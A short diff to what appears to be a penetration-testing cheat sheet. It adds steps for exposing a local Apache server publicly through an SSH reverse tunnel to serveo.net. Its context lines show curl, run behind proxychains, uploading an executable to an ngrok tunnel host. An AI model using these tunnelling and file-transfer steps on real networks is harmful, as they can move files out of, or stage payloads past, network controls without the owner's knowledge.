@@ -222,6 +222,10 @@ Transfer file using curl externally :
 proxychains4 python file_upload_server.py <forwarded port 4444>
 curl -F "files=@<os.exe>" http://<4.tcp.eu.ngrok.io>:<15881>
 ---------------------------------------------------------------------------------------------------------------
+To gain a temporarily public webserver using serveo.net and ssh :
+1- sudo service apache2 start
+2- ssh -R 80:192.168.1.16:80 serveo.net
+---------------------------------------------------------------------------------------------------------------
 
 
 
